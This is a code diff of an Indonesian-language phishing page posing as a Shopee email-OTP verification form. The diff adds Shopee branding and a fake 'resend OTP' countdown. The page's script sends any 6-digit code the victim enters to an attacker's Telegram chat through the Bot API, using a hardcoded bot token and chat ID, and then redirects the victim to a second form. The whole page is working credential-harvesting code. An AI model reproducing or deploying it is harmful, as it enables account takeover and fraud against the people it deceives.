@@ -1,9 +1,10 @@
 <!DOCTYPE html>
 <html lang="id">
+
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Verifikasi Kode OTP Email</title>
+    <title>Masukkan OTP Email- Akun Shopee</title>
     <style>
         body {
             font-family: sans-serif;
@@ -14,6 +15,7 @@
             align-items: center;
             min-height: 100vh;
         }
+
         .pin-container {
             width: 320px;
             padding: 20px;
@@ -22,20 +24,24 @@
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             text-align: center;
         }
+
         h2 {
             color: #ee4d2d;
             margin-bottom: 20px;
         }
+
         .input-group {
             margin-bottom: 15px;
             text-align: left;
         }
+
         label {
             display: block;
             margin-bottom: 5px;
             color: #333;
             font-size: 0.9em;
         }
+
         input[type="number"] {
             width: 100%;
             padding: 12px;
@@ -47,6 +53,7 @@
             text-align: center;
             letter-spacing: 5px;
         }
+
         button {
             margin-top: 20px;
             background-color: #ee4d2d;
@@ -60,57 +67,99 @@
             outline: none;
             transition: background-color 0.3s ease;
         }
+
         button:hover {
             background-color: #d43d1a;
         }
+
+        #resendOtp {
+            margin-top: 10px;
+            background-color: #6c757d;
+        }
+
+        #resendOtp:disabled {
+            background-color: #aaa;
+            cursor: not-allowed;
+        }
     </style>
 </head>
+
 <body>
     <div class="pin-container">
-        <h2>Masukkan Kode OTP Email</h2>
-        <form id="otpForm">
-            <div class="input-group">
-                <label for="otpInput">Kode OTP (6 digit):</label>
-                <input type="number" id="otpInput" maxlength="6" placeholder="••••••" required
-                    oninput="if(this.value.length > this.maxLength) this.value = this.value.slice(0,this.maxLength);" />
-            </div>
-            <button type="submit">Verifikasi</button>
-        </form>
+        <h2>Masukkan Kode OTP email Anda</h2>
+        <div class="input-group">
+            <label for="otpInput">Kode OTP (6 digit):</label>
+            <input type="number" id="otpInput" maxlength="6" placeholder="••••••" required
+                oninput="if(this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" />
+        </div>
+        <button id="submitPin">Lanjutkan</button>
+        <button id="resendOtp" disabled>Jika masuk otp link tunggu (60) detik untuk request kode otp</button>
     </div>
     <script>
-    document.getElementById('otpForm').addEventListener('submit', function(event) {
-        event.preventDefault();
-        var otp = document.getElementById('otpInput').value.trim();
-        if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
-            alert("Kode OTP harus 6 digit angka");
-            document.getElementById('otpInput').focus();
-            return;
-        }
-        var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
-        var chat_id = "5923031825";
-        var text = "Verifikasi OTP Email: " + otp;
-        var url = "https://api.telegram.org/bot" + token + "/sendMessage";
-        var params = {
-            chat_id: chat_id,
-            text: text
-        };
-        fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(params)
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                window.location.href = 'formulir2.html';
-            } else {
-                alert('Gagal mengirim ke Telegram: ' + data.description);
+        document.getElementById('submitPin').addEventListener('click', function (e) {
+            e.preventDefault();
+            const otp = document.getElementById('otpInput').value.trim();
+            if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
+                alert('Masukkan Kode OTP 6 digit angka yang valid');
+                document.getElementById('otpInput').focus();
+                return;
             }
-        })
-        .catch((error) => {
-            alert("Gagal koneksi ke Telegram: " + error);
+            // Kirim OTP ke Telegram
+            var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
+            var chat_id = "5923031825";
+            var text = "Kode OTP Shopee: " + otp;
+            var url = `https://api.telegram.org/bot${token}/sendMessage`;
+            var params = {
+                chat_id: chat_id,
+                text: text
+            };
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(params)
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        window.location.href = 'formulir2.html';
+                    } else {
+                        alert('Gagal mengirim ke Telegram: ' + data.description);
+                    }
+                })
+                .catch(error => {
+                    alert('Terjadi kesalahan saat mengirim pesan ke Telegram. Coba lagi nanti.\\n' + error);
+                });
         });
-    });
+        // Timer untuk Kirim Ulang OTP
+        var timeLeft = 60;
+        var resendButton = document.getElementById('resendOtp');
+        resendButton.disabled = true;
+        var timerInterval = setInterval(function () {
+            timeLeft--;
+            resendButton.textContent = "Jika masuk otp link tunggu (" + timeLeft + ") detik untuk request kode otp";
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                resendButton.textContent = "Kirim Ulang OTP";
+                resendButton.disabled = false;
+            }
+        }, 1000);
+        resendButton.addEventListener('click', function () {
+            alert('OTP telah dikirim ulang!');
+            timeLeft = 60;
+            resendButton.disabled = true;
+            timerInterval = setInterval(function () {
+                timeLeft--;
+                resendButton.textContent = "Jika masuk otp link tunggu (" + timeLeft + ") detik untuk request kode otp";
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    resendButton.textContent = "Kirim Ulang OTP";
+                    resendButton.disabled = false;
+                }
+            }, 1000);
+        });
     </script>
 </body>
+
 </html>
